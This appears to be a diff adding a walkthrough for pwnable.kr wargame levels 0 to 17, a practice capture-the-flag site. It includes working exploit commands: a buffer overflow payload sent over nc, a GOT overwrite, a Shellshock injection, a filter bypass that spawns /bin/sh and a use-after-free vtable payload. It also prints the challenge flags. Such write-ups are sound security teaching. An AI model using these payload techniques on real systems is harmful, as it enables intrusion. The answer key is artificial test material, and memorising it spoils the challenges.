@@ -1,0 +1,476 @@
+Level 0: fd
+
+Goal:
+Mommy! what is a file descriptor in Linux?
+
+* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU
+
+ssh fd@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls -l
+cat fd.c
+# Search Google for 'linux file descriptor'
+# Read: https://en.wikipedia.org/wiki/File_descriptor
+Open Python -> Enter: 0x1234 -> Copy the output: 4660
+# Get the decimal value of 0x1234
+./fd 4660
+LETMEWIN
+
+Flag: mommy! I think I know what a file descriptor is!!
+
+
+Level 1: collision
+
+Goal:
+Daddy told me about cool MD5 hash collision today.
+I wanna do something like that too!
+
+ssh col@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls -l
+cat col.c
+# Search Google for 'md5 hash collision attack'
+# Read: https://learncryptography.com/hash-functions/hash-collision-attack
+# We need to enter 5 numbers whose sum is 0x21DD09EC
+Open Python -> Enter 0x21DD09EC -> Output: 568134124
+568134124/5 = 113626824
+113626824 * 4 = 454507296
+568134124 - 454507296 = 113626828
+# We need to convert the appropriate numbers to hex
+hex(113626824) = 0x6c5cec8
+hex(113626828) = 0x6c5cecc
+./col $(python -c 'print("\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06")')
+
+Flag: daddy! I just managed to create a hash collision :)
+
+
+Level 2: bof
+
+Goal:
+Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+
+Solution:
+cat bof.c
+# Basic buffer overflow; we have to smash 'overflowme'
+chmod 777 bof
+gdb -q ./bof
+disas main
+disas func
+# Note: cmpl   $0xcafebabe,0x8(%ebp)
+# Note: lea    -0x2c(%ebp),%eax
+# 2c = 44
+br func
+r
+x $ebp+8
+# 0xffffd370 is the location of 0xdeadbeef
+x $ebp-44
+br *0xffffd33c
+r
+# 0xfffff33c is the location of 'overflowme'
+python -c 'print 0xffffd370 - 0xffffd33c'
+# The result is 52
+(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000
+
+Flag: daddy, I just pwned a buFFer :)
+
+
+Level 3: flag
+
+Goal: 
+Papa brought me a packed present! let's open it.
+
+Download : http://pwnable.kr/bin/flag
+
+This is reversing task. all you need is binary
+
+Solution:
+file flag
+gdb -q ./flag
+disas main
+info functions
+# Nothing comes out. Anti-debugging at play.
+strings flag
+# We see UPX. Let us examine further
+strings flag | grep UPX
+# The file is packed with UPX
+upx -d flag -o flag_0
+
+GDB Way:
+chmod 777 flag_0
+gdb -q flag_0
+disas main
+br *main+32
+br *main+39
+r
+c
+x/s $rdx
+# Examine the string at rdx
+
+Binary Ninja Way:
+Open the file with BN
+main
+Double-click on 0x496658
+
+Flag: UPX...? sounds like a delivery service :)
+
+
+Level 4: passcode
+
+Mommy told me to make a passcode based login system.
+My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?
+
+ssh passcode@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls -l
+cat passcode.c
+# Note the buffer size is 100
+# Note: if(passcode1==338150 && passcode2==13371337)
+gdb -q ./passcode
+disas main
+disas welcome
+# Note the lea    -0x70(%ebp),%edx is probably 'name'
+disas login
+# Note the mov    -0x10(%ebp),%edx is probably 'passcode1'
+python -c "print 0x70 - 0x10"
+# The result is 96, which is our offset
+# We can control passcode1 to overwrite a function in the global offset table, such as fflush() with an address that lets us call system
+disas fflush
+# Note that fflush's address is 0x804a004
+# Note that the address we need is 0x080485e3
+python -c "print  0x080485e3"
+# The result is 134514147
+python -c "print 96 * 'A' + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
+
+Flag: Sorry mom.. I got confused about scanf usage :(
+
+
+Level 5: random
+
+Daddy, teach me how to use random value in programming!
+
+ssh random@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls
+cat random.c
+# Note that (the key ^ random) == 0xdeadbeef
+# Note that rand() is not provided arguments, hence the output will always be the same
+cp random.c /tmp/
+cd /tmp
+vi random.c
+Under random = rand(); add: printf("rand: %d\n", random);
+gcc random.c
+./a.out
+# Random is 1804289383
+python -c "print 0xDEADBEEF ^ 1804289383"
+# The key is 3039230856
+./random
+Input: 3039230856
+
+Flag: Mommy, I thought libc random is unpredictable...
+
+
+Level 6: input
+
+Mom? how can I pass my input to a computer program?
+
+ssh input2@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls
+cat input.c
+# Note this level is divided into stages we must bypass
+# We will build a program that bypasses the program stage by stage
+# See bypass_input.c
+mkdir /tmp/bypass_input
+cd /tmp/bypass_input
+vi bypass_input.c
+<Paste contents of 'bypass_input.c'>
+ln -s /home/input2/flag flag
+# Create a symbolic link to the flag
+gcc -o bypass_input bypass_input.c
+./bypass_input
+
+Flag: Mommy! I learned how to pass various input in Linux :)
+
+
+Level 7: leg
+
+Daddy told me I should study arm.
+But I prefer to study my leg!
+
+Download : http://pwnable.kr/bin/leg.c
+Download : http://pwnable.kr/bin/leg.asm
+
+ssh leg@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+gedit leg.asm
+gedit leg.c
+# We are dealing with ARM
+# Read: http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0473e/Cacdbfji.html
+# Read: http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0337h/Chdedegj.html
+#
+# In ARM, the value of PC is the addr of the current instruction + 8 bytes
+# key1:
+#	mov	r3, pc
+#	mov	r0, r3
+# Which translates into: r0 = 0x00008cdc + 8
+# key 2:
+#	add	r6, pc, #1
+#	bx	r6
+# Switches to thumb state
+# For B, BL, CBNZ, and CBZ instructions, the value of the PC is the addr of the current instruction + 4 bytes
+#	mov	r3, pc
+#	adds	r3, #4
+#	mov	r0, r3
+# Which translates into: r0 = 0x00008d04 + 4 + 4
+# key 3:
+#	bl	0x8d20 <key3>
+# 	mov	r3, r0
+# Key 3 returns LR which is the link register, which stores the return address
+# Which translates into: r0 = 0x00008d80
+#
+# key1()+key2()+key3()) == key
+python -c "print (0x00008cdc + 8) + (0x00008d04 + 4 + 4) + 0x00008d80"
+# The key is 108400
+./leg
+Input: 108400
+
+Flag: My daddy has a lot of ARMv5te muscle!
+
+
+Level 8: mistake
+We all make mistakes, let's move on.
+(don't take this too seriously, no fancy hacking skill is required at all)
+
+This task is based on real event
+Thanks to dhmonkey
+
+hint : operator priority
+
+ssh mistake@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls
+cat mistake.c
+'''
+Note the fd=open("/home/mistake/password",O_RDONLY,0400) < 0
+This equals 0, so fd = 0 < 0, which is 0
+Since the key of the challenge is XOR, this means that our first input should be 
+ten zeroes and our second input ten ones
+'''
+./mistake
+Input: 0000000000
+Input: 1111111111
+
+Flag: Mommy, the operator priority always confuses me :(
+
+
+Level 9: shellshock
+Mommy, there was a shocking news about bash.
+I bet you already know, but lets just make it sure :)
+
+ssh shellshock@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls
+cat shellshock.c
+# It's the shellshock bug, see: https://www.symantec.com/connect/sites/default/files/users/user-2598031/shellshock-command-diagram-600px_v2.png
+x='() { :;}; /home/shellshock/bash -c "cat /home/shellshock/flag"' ./shellshock
+
+Flag: only if I knew CVE-2014-6271 ten years ago..!!
+
+
+Level 10: coin 1
+Mommy, I wanna play a game!
+(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)
+
+Running at : nc pwnable.kr 9007
+
+Solution:
+'''
+This challenge has us examine a given number of coins to find the counterfeit ones. 
+These counterfeit coins look the same as the real ones but their weight is different.
+We have 30 seconds to find 100 counterfeit coins.
+'''
+# Network response time was too slow, 
+# so we have to work under a pwnable.kr server /tmp folder
+ssh shellshock@pwnable.kr -p2222 (pw:guest)
+cd /tmp
+vi counterfeit_coins.py
+# See counterfeit_coins.py
+python counterfeit_coins.py
+
+Flag: b1NaRy_S34rch1nG_1s_3asy_p3asy
+
+
+Level 11: blackjack
+Hey! check out this C implementation of blackjack game!
+I found it online
+* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html
+
+I like to give my flags to millionares.
+how much money you got?
+
+Running at : nc pwnable.kr 9009
+
+Solution:
+Input: 1000000000
+Input: 1000000000
+Repeat and play until you win
+When you win and prompted to win again: Y
+
+Flag: YaY_I_AM_A_MILLIONARE_LOL
+
+
+Level 12: lotto
+Mommy! I made a lotto program for my homework.
+do you want to play?
+
+ssh lotto@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls
+cat lotto.c
+'''
+Note:
+
+// calculate lotto score
+	int match = 0, j = 0;
+	for(i=0; i<6; i++){
+		for(j=0; j<6; j++){
+			if(lotto[i] == submit[j]){
+				match++;
+			}
+		}
+	}
+
+// win!
+	if(match == 6){
+		system("/bin/cat flag");
+	}
+
+The program will compare each input character six times
+To win you only need six characters to match
+Which just means we can enter any equal six symbols and eventually get it right
+'''
+./lotto
+Input: $$$$$$
+# I won on the sixth attempt.
+
+Flag: sorry mom... I FORGOT to check duplicate numbers... :(
+
+
+Level 13: cmd1
+Mommy! what is PATH environment in Linux?
+
+ssh cmd1@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls
+cat cm1.c
+# We can't use "flag", "sh", "tmp" nor PATH, so let's just try to cat with a wildcard
+./cmd1 "/bin/cat f*"
+
+Flag: mommy now I get what PATH environment is for :)
+
+
+Level 14: cmd2
+Daddy bought me a system command shell.
+but he put some filters to prevent me from playing with it without his permission...
+but I wanna play anytime I want!
+
+ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
+
+Solution:
+ls
+cat cmd2.c
+# Since we are very limited in issuing commands using ascii, we can use octal bytes
+# \/\b\i\n\/\s\h  =  \\057\\142\\151\\156\\057\\163\\150
+./cmd2 "\$(echo -n '\\057\\142\\151\\156\\057\\163\\150')"
+/bin/cat flag
+
+Flag: FuN_w1th_5h3ll_v4riabl3s_haha
+
+
+Level 15: uaf
+Mommy, what is Use After Free bug?
+
+ssh uaf@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+ls
+cat uaf.cpp
+'''
+Note in case 2 (after):
+	len = atoi(argv[1]);
+	data = new char[len];
+	read(open(argv[2], O_RDONLY), data, len);
+	cout << "your data is allocated" << endl;
+
+Which translates to len bytes being allocated on the heap and the ptr being in data
+Note argv1 = len and argv2 = file with the pointer to be read
+
+'''
+gdb -q ./uaf
+disas main
+br *main
+r
+scp -i key_file.pem -P 2222 uaf@pwnable.kr:/home/uaf/uaf ./
+# Copying the file to our local directory
+Drag uaf to Binary Ninja
+Ctrl + F -> Man
+# Note under the vtable for Man, there is xref to 0x401288 where: 
+# mov     qword [rax], data_401570
+Back in GDB: x/20a 0x401570
+# Note:
+# 0x401570 <_ZTV3Man+16>:	0x40117a <_ZN5Human10give_shellEv>
+# 0x4012d2 <_ZN3Man9introduceEv>
+# We will feed give_shell to introduce; 401570 - 8 = 401568
+python -c "print '\x68\x15\x40\x00\x00\x00\x00\x00'" > /tmp/cookies
+./uaf 24 /tmp/cookies
+3 # free
+2 # after
+2 # after
+1 # use
+cat flag
+
+Flag: yay_f1ag_aft3r_pwning
+
+
+Level 16: codemap
+I have a binary that has a lot information inside heap.
+How fast can you reverse-engineer this?
+(hint: see the information inside EAX,EBX when 0x403E65 is executed)
+
+download: http://pwnable.kr/bin/codemap.exe
+
+ssh codemap@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+# This challenge was geared towards using the Codemap plug-in for IDA.
+
+
+Level 17: memcpy
+Are you tired of hacking?, take some rest here.
+Just help me out with my small experiment regarding memcpy performance. 
+after that, flag is yours.
+
+http://pwnable.kr/bin/memcpy.c
+
+ssh memcpy@pwnable.kr -p2222 (pw:guest)
+
+Solution:
+
+
